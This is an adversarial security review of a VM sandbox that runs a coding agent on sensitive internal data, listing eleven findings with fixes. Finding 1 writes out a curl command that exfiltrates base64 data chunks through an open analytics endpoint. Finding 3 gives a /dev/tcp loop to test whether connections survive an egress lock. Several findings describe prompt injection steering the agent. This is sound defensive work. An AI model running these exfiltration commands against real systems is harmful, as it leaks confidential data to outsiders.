# Adversarial review: brine-secure for sensitive internal data

Date: 2026-11-10. Reviewed: `main` at f0e9c2d plus the uncommitted WIP in the main checkout (copied into this worktree).

Goal under test: a user can point Pi + Brine at internal sensitive data, and that data can't leave places we trust.

Threat model used:

- **Prompt injection in the data.** Sensitive data is often untrusted content (emails, tickets, PDFs, logs). Assume the agent can be made to run any shell command as `agent`.
- **Malicious code in the VM.** Assume a compromised npm package or Node tarball runs as root during bootstrap.
- **Other people with partial access**: OpenStack project members, Brine admins and other Brine users, anyone on the network path.

## Verdict

The VM sandbox design is sound in shape: Neutron enforces egress outside the guest, the key isn't in Terraform state, and `/data` is a throwaway copy. But it is **not ready for sensitive data**, for two reasons that the VM can't fix:

1. **Brine itself is out of scope for sensitive data** by its own terms, and we don't know what it logs or where every model runs.
2. **"Egress to Brine only" actually means "egress to 199.241.160.16:443"**, and that IP also serves a public Plausible Analytics instance with an open registration page. That is likely an exfiltration channel to the internet.

## Findings, most severe first

### 1. Brine's IP serves Plausible Analytics, an internet-readable write channel (High, verified in part)

`brine_out` allows TCP 443 to `brine_ip/32`. That IP is a shared reverse proxy. Any `Host` header other than `brine.sharcnet.ca` gets a self-hosted **Plausible Analytics** instance (the default vhost). Its `/register` page shows a working sign-up form.

Attack: an outsider registers a Plausible account and adds a site. Injected instructions in `/data` make the agent run
`curl -k -H 'Host: anything' https://199.241.160.16/api/event -d '{"domain":"<their site>","name":"pageview","url":"https://x/<base64 chunk>"}'`.
The outsider reads the chunks from their dashboard anywhere. No DNS is needed, and the `curl https://1.1.1.1` check doesn't catch it.

Checked: the vhost behaviour and the open register page (plain GETs, no account made, no events sent). Not checked end to end: whether registration needs email activation that's actually enforced. An attacker controls their own email, so activation doesn't help.

Fix: Brine needs its own IP, or the proxy must drop any request on that IP whose `Host`/SNI isn't `brine.sharcnet.ca`. Also ask whoever runs Plausible to set `DISABLE_REGISTRATION=invite_only`. Recheck all other vhosts on that IP after any change.

### 2. Brine's terms and unknowns block sensitive data (High, policy)

The README already says it: Brine's terms say not to send sensitive data. Every file Pi reads goes into a prompt. Before this can change, the Brine owners need to answer:

- Are prompts or responses stored anywhere? (LiteLLM spend logs with `store_prompts_in_spend_logs`, Langfuse or other callbacks, vLLM request logging, proxy access logs with bodies.) Who can read them, and for how long?
- Does any model route off SHARCNET? `explore1.md` flags `gaggle-trial`. `/openapi.json` lists provider pass-through routes (`/openai_passthrough/*`, `/anthropic/*`, `/gemini/*`, `/vertex_ai/*`, `/bedrock/*`, `/azure/*`, `/langfuse/*`), plus `/mcp`, `/a2a`, `/v1/files`, `/v1/batches`, vector stores and assistants. LiteLLM lists most routes whether they're configured or not, so this proves nothing alone. But each one that works with a user key is either a path off-site or somewhere data persists that other things can read.
- Is Brine to vLLM traffic encrypted, and who administers the workers?

Our code makes this worse: `pi-brine-setup.mjs` registers **every** chat model `/v1/models` returns. If an external model is added to Brine later, it appears in Pi's `/model` list without anyone noticing.

Fix: on our side, hard-code an allowlist of on-prem models. The real control is on Brine: a key whose `models` list only has on-prem models, with pass-through, files and MCP routes off for that key or team.

### 3. Bootstrap runs unpinned internet code as root, and that code stays on the VM (High)

During bootstrap the VM has open egress and runs, as root:

- `curl nodejs.org/... | tar`, with no checksum or signature check
- `npm install -g @mariozechner/pi-coding-agent@0.73.1`. Only the top package is pinned. Its 21 direct dependencies are `^` ranges (`undici`, `jiti`, `extract-zip`, `glob`, `@mariozechner/pi-ai`, ...), so whatever their transitive trees resolve to on the day gets installed, and postinstall scripts run as root.

The lock happens afterwards, but anything installed then is still there when the data and key arrive. With root it reads `/data` and `models.json`. Without finding 1 it could only send data to Brine. With finding 1 it has the Plausible channel.

A related risk I haven't verified: **established connections may survive the lock.** Removing a security group from a port doesn't reliably cut tracked connections on every Neutron backend. (OVN especially has a history of keeping `ct.est` flows after an ACL is removed.) Code from bootstrap could open a long-lived TLS connection before the lock and keep it open. The 1.1.1.1 check only tests *new* connections.
Test it on Nibi: during bootstrap run `nohup bash -c 'exec 3<>/dev/tcp/<your host>/443; while sleep 2; do echo ping >&3; done' &`, then lock, and watch whether pings keep arriving.

Fix (also fixes 6 and two README limits): **use a pre-built image and drop the bootstrap phase.** Build an image with Node and Pi installed from a lockfile (`npm ci` against a committed `package-lock.json`, Node tarball checked against `SHASUMS256.txt`). Boot the VM with only the locked security group from the start and `config_drive = true`, so cloud-init never needs the metadata service. The VM then never has open egress.

### 4. A long-lived personal Brine key sits where the agent can read it (Medium)

`./brine.key` is the user's own key, and it's written to `~agent/.pi/agent/models.json`, which the agent can read. Prompt injection can use it against any Brine route the key allows (finding 2's list), for as long as the key lives. That's well past the VM's lifetime.

Fix: what `explore1.md` already planned. Mint a per-sandbox virtual key (`/key/generate` with on-prem `models`, `max_budget`, `duration` of a few hours) at launch, and `/key/delete` it in the EXIT trap. That needs a Brine-side key or service account allowed to mint keys, and that key stays on the laptop.

### 5. The OpenStack project is the real trust boundary (Medium)

Anyone with a role in the project can snapshot the running instance (`openstack server image create`) and boot the copy with their own security group, which gives them `/data` and the key. They can also attach a group with open egress to the sandbox port, or open the console. The `clouds.yaml` application credential in the repo folder can do all of this too, and it's unrestricted and doesn't expire by default. Cloud operators can always read the disks.

Fix: use one project per data-access group, with members limited to people cleared for the data. Create the application credential with an expiry, and restricted if the cloud allows it. Write this in the README as an explicit assumption.

### 6. No cleanup if the laptop dies (Medium)

Teardown is a bash `EXIT` trap. A `kill -9`, power loss, a dead laptop battery, or losing the Nibi API allowlist (for example, a new IP) leaves the VM running with the data and key and nobody watching. Even a clean destroy doesn't scrub the disk. Ceph/RBD deletes aren't wipes.

Fix: per-session keys (4) put a time limit on the key. For the VM, run a sweeper in the project that deletes `brine-*` servers older than N hours, or at least add `shutdown -P +<N>` in cloud-init so it stops. For data at rest, ask the Nibi admins whether ephemeral disks are encrypted. If they aren't, that has to be accepted in writing.

### 7. The first SSH connection trusts any host key (Medium-Low)

`rm -f .ssh/known_hosts` plus `StrictHostKeyChecking accept-new` means the first key presented is trusted. Anyone on the path at that moment (campus network, hotel wifi) can get `brine.key` and `/data`.

Fix: cloud-init prints the host key fingerprints to the console. Read them with `openstack console log show`, write them to `known_hosts`, and set `StrictHostKeyChecking yes`. That's about 5 lines.

### 8. The lock check runs inside the thing it's checking, and only tests one path (Low)

`curl https://1.1.1.1` runs as `agent` in the VM, so compromised code (3) can make it pass. It also tests only one IP and port. Neutron is the enforcement either way, so this is a check of our config, not a defence.

Fix: also check from the control plane that the port's security groups are exactly `[<name>-sandbox]` and that the group's egress rules are exactly the one Brine rule (`openstack port show -c security_group_ids`, `openstack security group rule list`). Keep the curl as a smoke test.

### 9. Smaller things

- `--data` copies everything, including `.git`, `.env` and credential files. Anything in DIR can go into a prompt. Say so in the README, or add an rsync exclude list.
- The data can carry prompt injection itself. Pi loads `AGENTS.md` and `.pi/` from the working tree. `/data` isn't the cwd, but if the agent `cd`s into it, those files steer the agent. Findings 1 and 4 are what turn that into real harm.
- SSH ingress is `<public IP>/32`. Behind campus NAT or eduroam, that's everyone on the NAT. Key-only auth makes it acceptable, but `SSH_FROM_CIDR` set to a VPN range is better.
- `curl api.ipify.org` sends the launcher's IP to a third party. Trivial, but it contradicts "never leaves SHARCNET". `SSH_FROM_CIDR` already avoids it.
- WIP diff: dropping `lock_passwd: true` is a no-op because that's cloud-init's default. The new `until` lock loop fails closed if SSH flakes (with a misleading message). Both are fine.

## What holds up

- Egress enforced by Neutron outside the guest, with `delete_default_rules`. IPv6 egress is denied because no IPv6 rule exists.
- The Brine key never enters Terraform state, user data, or metadata.
- TLS to Brine checks the certificate (wildcard `*.sharcnet.ca`), so the pinned `/etc/hosts` entry can't be quietly redirected.
- `/data` is a root-owned, read-only copy, and nothing is synced back.

## Order of work if this goes ahead

1. Brine owners: dedicated IP or strict `Host`/SNI filtering (1), plus written answers on logging and model location (2). Without these, stop.
2. Pre-built image, no bootstrap egress, config drive (3).
3. Per-sandbox scoped keys and a model allowlist (2, 4).
4. A dedicated project and an expiring credential (5), a sweeper (6), host key pinning (7), the control-plane lock check (8).

## Follow-up adversarial review, 2026-11-10

Reviewed commit `547bde6ec4d777decd5582208647f795725a342a` on branch `security/adversarial-review-followup`. The earlier review above is preserved. This pass traced the launcher, Terraform resources, cloud-init and documented data flow. No `AGENTS.md` was present in this checkout or the checked ancestor directories.

Validation used a temporary copy of the actual launcher, dummy credentials and data, and local replacements for Terraform, SSH, name lookup and rsync. No cloud resources were changed, no real credentials were read, and no requests were sent to Brine or an exfiltration destination. Earlier remote observations have not been revalidated. These are two additional findings; the existing blockers still apply.

### 10. Relaunching can reopen internet egress on a VM holding sensitive data — High

Evidence: `sandbox:35-40` always runs `tf apply -var bootstrap=true` against the same working-directory state. `main.tf:114-134` attaches the bootstrap group to the existing port; changing `bootstrap` does not require a fresh instance. That group allows all IPv4 egress at `main.tf:108-112`. The launcher has no check that the state is empty, no forced instance replacement, and no lock covering the whole session.

A prior session can survive an interrupted launcher or failed destroy, as finding 6 describes. If the image, Brine IP and other instance inputs remain unchanged, a subsequent launch can reuse that VM and restore open egress while `/data`, Pi sessions and `models.json` still exist. A process left by prompt injection can wait for the network to reopen and send them out. This bypass needs neither another service on Brine's IP nor an established connection surviving the lock. A second invocation in the same checkout during an active session can cause the same exposure. Terraform's individual operation locks do not protect the interval between applies or the interactive session.

Local validation: the unchanged launcher completed against mocked commands with a prior-session data marker present. The recorded sequence was `init`, `apply bootstrap=true`, `output`, `apply bootstrap=false`, data copy, `destroy`. Nothing inspected or removed the prior data before requesting open egress. Resource reuse follows from the Terraform configuration; an actual Neutron transition and exfiltration were not tested.

Fix: remove bootstrap networking by booting a prepared image under the final security group. Until then, refuse to launch when state contains an existing instance or port, require verified destruction before retrying, and hold a launcher lock from before initialization until teardown finishes. Give each session its own state and instance identity. Never enable bootstrap egress on a previously used VM.

Acceptance check: leave dummy data and a waiting test process in a sandbox, interrupt its launcher, and attempt another launch. It must refuse or use a new VM without loosening the old VM's rules. A simultaneous second invocation must also refuse or use isolated resources. Perform the cloud check only with dummy data and an approved test endpoint.

### 11. Relative `--data` paths can upload the launcher's credentials instead of the intended directory — High

Evidence: `sandbox:6` changes to the script's directory before `sandbox:13-15` validates and resolves `--data`. At `sandbox:69-70`, rsync copies that resolved directory without exclusions. A user in another project running `/path/to/brine-secure/sandbox --data .` therefore uploads the brine-secure directory, rather than their current project. The README puts `clouds.yaml` and `brine.key` in that directory, and the launcher creates its SSH private key there too. Git ignore rules do not exclude any of these from rsync.

The upload makes these files root-owned but mode `0444`, so the agent can read them. This introduces a cloud application credential into the guest, beyond finding 4's expected Brine credential. Any data the agent reads may then go to Brine. If another egress path is available, the stolen cloud credential can also leave the VM and give an attacker the project access described in finding 5. Cloud API access from the locked VM itself was not tested and is not required for the credential disclosure.

Local validation: invoked the temporary launcher from a separate caller directory with `--data .`. The mocked rsync recorded the launcher directory as its source. That directory contained dummy `clouds.yaml`, `brine.key` and `.ssh` files. No real credentials were copied. Absolute paths do not have this resolution bug; other relative paths can select the wrong directory or fail validation.

Fix: resolve and validate the data argument against the original caller directory before changing directories. Reject source directories that include the launcher's credential/state directory, or stage data through an explicit selection process with credential exclusions. Display the resolved source and document that hidden files are included. Path correction alone does not prevent a user from explicitly selecting a credential directory.

Acceptance check: invoke the launcher from a sibling project with `--data .` and with `--data relative/subdirectory`, and verify the source is under the caller's directory. Use dummy credential files to verify that selecting the launcher directory cannot transfer them.

### Effect on release readiness

The project remains unsuitable for sensitive internal data under the existing review's conditions. Finding 10 adds a direct internet-egress failure during reuse or overlapping launches. Fix it before treating the two-phase boot sequence as a confidentiality boundary. Finding 11 can send cloud credentials to the guest through ordinary CLI usage and should be fixed before further data onboarding.
